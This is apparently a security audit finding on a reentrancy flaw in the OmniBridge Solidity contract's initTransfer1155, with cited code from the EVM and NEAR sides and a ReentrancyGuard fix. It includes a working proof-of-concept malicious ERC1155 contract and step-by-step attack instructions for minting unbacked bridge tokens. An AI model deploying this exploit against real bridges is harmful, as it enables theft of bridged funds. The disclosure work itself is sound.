### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Allows Fraudulent `InitTransfer` Events Without Locking Tokens — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` and then makes an external call to `IERC1155(tokenAddress).safeTransferFrom`. The ERC1155 standard mandates that `safeTransferFrom` invokes `onERC1155Received` on the recipient, but the malicious token's `safeTransferFrom` can also call back into `initTransfer1155` before returning. Because `logMetadata1155` is permissionless, any attacker can register a malicious ERC1155 token and exploit this reentrancy to emit multiple `InitTransfer` events with distinct nonces while locking zero tokens. The NEAR side treats every `InitTransfer` event emitted by the registered factory as proof of locked funds and mints bridge tokens accordingly.

---

### Finding Description

`initTransfer1155` follows this execution order:

1. `currentOriginNonce += 1` — state written
2. `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to attacker-controlled contract**
3. `initTransferExtension(...)` — Wormhole message (in Wormhole variant)
4. `emit BridgeTypes.InitTransfer(...)` — event emitted [1](#0-0) 

The bridge's `onERC1155Received` guard only rejects transfers where `operator != address(this)`: [2](#0-1) 

When the bridge itself calls `safeTransferFrom`, the ERC1155 contract calls `onERC1155Received` with `operator = address(bridge)`, so the guard passes. A malicious ERC1155 token can therefore:

1. Receive the outer `safeTransferFrom` call from the bridge.
2. Re-enter `initTransfer1155` before calling `onERC1155Received`.
3. Inside the re-entrant call, the bridge calls `safeTransferFrom` again on the malicious token; the malicious token calls `onERC1155Received(bridge, ...)` — operator is `bridge`, guard passes — and returns normally.
4. The re-entrant call emits `InitTransfer` with nonce N+2 without locking any tokens.
5. Control returns to the outer `safeTransferFrom`; the malicious token calls `onERC1155Received` for the outer call, which also passes.
6. The outer call emits `InitTransfer` with nonce N+1.

The malicious token never needs to actually transfer any tokens. The bridge has no `ReentrancyGuard` and no `nonReentrant` modifier on `initTransfer1155`. [3](#0-2) 

`logMetadata1155` is fully permissionless — no role check, no whitelist: [4](#0-3) 

The NEAR `fin_transfer_callback` validates only that the emitter address is a registered factory and that the token has registered decimals. Both conditions are satisfied for a malicious ERC1155 token that was registered via `logMetadata1155`: [5](#0-4) 

---

### Impact Explanation

Every fraudulent `InitTransfer` event emitted by the bridge contract is indistinguishable from a legitimate one on the NEAR side. NEAR mints bridge tokens for each event. The attacker receives N×amount bridge tokens while locking zero ERC1155 tokens on EVM. This directly violates the bridge's core invariant:

> *"InitTransfer must only be emitted in a code path where tokens have already been burned/locked in the same transaction."* [6](#0-5) 

If the minted bridge token has any market value (e.g., it is traded on NEAR DEXes or used as collateral), the attacker can sell the fraudulently minted tokens for profit. Additionally, if the bridge later accumulates real ERC1155 holdings for the same token (e.g., through legitimate deposits), the inflated NEAR-side supply allows the attacker to redeem more ERC1155 tokens than were ever deposited — a direct theft of bridged funds.

---

### Likelihood Explanation

The attack requires no privileged role. The attacker only needs to:

1. Deploy a malicious ERC1155 contract (trivial, no cost beyond gas).
2. Call `logMetadata1155` (permissionless, no access control).
3. Wait for the NEAR relayer to process the `LogMetadata` event and register the token.
4. Call `initTransfer1155` with the malicious token address.

This is a fully self-contained, unprivileged attack path available to any EVM user.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply the `nonReentrant` modifier to both `initTransfer` and `initTransfer1155`. This is the same pattern recommended in the reference report and is the standard defense for this class of vulnerability.

```solidity
import {ReentrancyGuardUpgradeable} from
    "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    ReentrancyGuardUpgradeable,  // add
    IERC1155Receiver
{
    // ...
    function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
    function initTransfer(...)    external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
}
```

Also add a `nonReentrant` guard to `finTransfer` to prevent cross-function reentrancy (e.g., a malicious ERC1155 recipient in `finTransfer` re-entering `initTransfer1155`). [7](#0-6) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    uint256 public depth;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by bridge.initTransfer1155 → this.safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256, bytes calldata
    ) external {
        if (depth < 3) {
            depth++;
            // Re-enter initTransfer1155 — gets a new nonce each time,
            // emits a new InitTransfer event, but locks zero tokens
            bridge.initTransfer1155(address(this), tokenId, 1, 0, 0, "attacker.near", "");
            depth--;
        }
        // Call onERC1155Received on the bridge with operator = bridge (passes guard)
        IERC1155Receiver(msg.sender).onERC1155Received(
            msg.sender, address(this), tokenId, 1, ""
        );
    }

    // Satisfy ERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function setApprovalForAll(address, bool) external {}
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}
```

**Attack steps:**
1. Deploy `MaliciousERC1155(bridgeAddress)`.
2. Call `bridge.logMetadata1155(maliciousToken, tokenId)` — permissionless, registers the token.
3. Wait for NEAR to process the `LogMetadata` event.
4. Call `bridge.initTransfer1155(maliciousToken, tokenId, 1, 0, 0, "attacker.near", "")`.
5. Reentrancy fires: 3 `InitTransfer` events are emitted (nonces N+1, N+2, N+3) while zero tokens are locked.
6. NEAR processes all three events and mints 3× bridge tokens to `attacker.near`. [8](#0-7) [2](#0-1)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L28-34)
```text
contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    IERC1155Receiver
{
    using SafeERC20 for IERC20;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L279-367)
```text
    function finTransfer(
        bytes calldata signatureData,
        BridgeTypes.TransferMessagePayload calldata payload
    ) external payable whenNotPaused(PAUSED_FIN_TRANSFER) {
        if (completedTransfers[payload.destinationNonce]) {
            revert NonceAlreadyUsed(payload.destinationNonce);
        }

        completedTransfers[payload.destinationNonce] = true;

        bytes memory borshEncoded = bytes.concat(
            bytes1(uint8(BridgeTypes.PayloadType.TransferMessage)),
            Borsh.encodeUint64(payload.destinationNonce),
            bytes1(payload.originChain),
            Borsh.encodeUint64(payload.originNonce),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(payload.tokenAddress),
            Borsh.encodeUint128(payload.amount),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(payload.recipient),
            bytes(payload.feeRecipient).length == 0 // None or Some(String) in rust
                ? bytes("\x00")
                : bytes.concat(
                    bytes("\x01"),
                    Borsh.encodeString(payload.feeRecipient)
                ),
            bytes(payload.message).length == 0
                ? bytes("")
                : Borsh.encodeBytes(payload.message)
        );
        bytes32 hashed = keccak256(borshEncoded);

        if (ECDSA.recover(hashed, signatureData) != nearBridgeDerivedAddress) {
            revert InvalidSignature();
        }

        MultiTokenInfo memory multiToken = multiTokens[payload.tokenAddress];

        if (payload.tokenAddress == address(0)) {
            // slither-disable-next-line arbitrary-send-eth
            (bool success, ) = payload.recipient.call{value: payload.amount}(
                ""
            );
            if (!success) revert FailedToSendEther();
        } else if (multiToken.tokenAddress != address(0)) {
            IERC1155(multiToken.tokenAddress).safeTransferFrom(
                address(this),
                payload.recipient,
                multiToken.tokenId,
                payload.amount,
                ""
            );
        } else if (customMinters[payload.tokenAddress] != address(0)) {
            ICustomMinter(customMinters[payload.tokenAddress]).mint(
                payload.tokenAddress,
                payload.recipient,
                payload.amount
            );
        } else if (isBridgeToken[payload.tokenAddress]) {
            if (payload.message.length == 0) {
                IBridgeToken(payload.tokenAddress).mint(
                    payload.recipient,
                    payload.amount
                );
            } else {
                IBridgeToken(payload.tokenAddress).mint(
                    payload.recipient,
                    payload.amount,
                    payload.message
                );
            }
        } else {
            IERC20(payload.tokenAddress).safeTransfer(
                payload.recipient,
                payload.amount
            );
        }

        finTransferExtension(payload);

        emit BridgeTypes.FinTransfer(
            payload.originChain,
            payload.originNonce,
            payload.tokenAddress,
            payload.amount,
            payload.recipient,
            payload.feeRecipient
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** near/omni-bridge/src/lib.rs (L705-732)
```rust
        let Ok(ProverResult::InitTransfer(init_transfer)) = Self::decode_prover_result(0) else {
            env::panic_str(BridgeError::InvalidProofMessage.to_string().as_str())
        };
        require!(
            self.factories
                .get(&init_transfer.emitter_address.get_chain())
                == Some(init_transfer.emitter_address),
            BridgeError::UnknownFactory.as_ref()
        );

        let decimals = self
            .token_decimals
            .get(&init_transfer.token)
            .near_expect(BridgeError::TokenDecimalsNotFound);

        let destination_nonce =
            self.get_next_destination_nonce(init_transfer.recipient.get_chain());
        let transfer_message = TransferMessage {
            origin_nonce: init_transfer.origin_nonce,
            token: init_transfer.token,
            amount: Self::denormalize_amount(init_transfer.amount.0, decimals).into(),
            recipient: init_transfer.recipient,
            fee: Self::denormalize_fee(&init_transfer.fee, decimals),
            sender: init_transfer.sender,
            msg: init_transfer.msg,
            destination_nonce,
            origin_transfer_id: None,
        };
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```
